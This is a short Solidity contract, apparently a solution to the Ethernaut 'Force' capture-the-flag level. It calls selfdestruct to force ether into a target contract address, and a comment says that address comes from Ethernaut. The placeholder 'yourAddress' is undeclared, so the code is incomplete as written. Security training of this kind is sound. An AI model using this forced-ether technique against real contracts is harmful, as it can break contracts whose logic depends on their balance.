pragma solidity 0.6.0;

contract ForceAttack {
    
    uint public balance;
    
    constructor() payable public {
        balance = msg.value;
    }
    
    function kamikaze() public {
        //Where yourAddress is the targeted address instance you get from Ethernaut
        address payable cont = yourAddress;
        selfdestruct(cont);
    }
}